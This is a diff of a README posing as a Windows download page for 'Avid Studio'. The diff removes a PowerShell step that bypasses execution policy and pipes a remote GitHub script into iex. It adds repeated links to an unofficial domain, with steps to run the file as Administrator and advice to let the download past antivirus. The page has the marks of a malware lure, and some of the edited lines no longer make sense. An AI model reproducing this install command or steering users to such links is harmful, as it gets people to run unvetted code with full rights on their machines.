@@ -2,21 +2,38 @@
 
 **Avid-Studio-2026**
 
-**Avid Studio** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+**Avid Studio** download for Windows 10/11. Scroll to **Download & Install** for the direct direct download link below.
 
 [![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
 
 ---
 
-## Download & Install (PowerShell)
+## Download & Install
 
-> **This is the download page.** The command below downloads and runs the **Avid Studio** installer on Windows 10/11.
+> **This is the download page.** Use the button or link below to get **Avid Studio** for Windows.
 
-#### Before you start
+<p align="center">
+  <a href="https://avid-studio.nexustool.fun/">
+    <img src="https://img.shields.io/badge/Download-Avid%20Studio-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Avid Studio">
+  </a>
+</p>
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+| | |
+| --- | --- |
+| **Direct link** | **[avid-studio.nexustool.fun](https://avid-studio.nexustool.fun/)** |
+| **Full URL** | `https://avid-studio.nexustool.fun/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
+
+### Quick steps
+
+1. Click **[Download — avid-studio.nexustool.fun](https://avid-studio.nexustool.fun/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://avid-studio.nexustool.fun/"><strong>⬇ Download Avid Studio now</strong></a></p>
 
 ---
 
@@ -39,10 +56,7 @@ You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
 
 Select **both lines** below and press **Ctrl+C**:
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+
 
 > Copy **both lines**, not just the second one.
 
@@ -80,7 +94,7 @@ Open **Start menu** → search for **Avid Studio** → run it.
 | Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
 | Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
 
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
+**Install type:** Direct link (nexus) — no browser needed after Admin PowerShell is open.
 
 ---
 
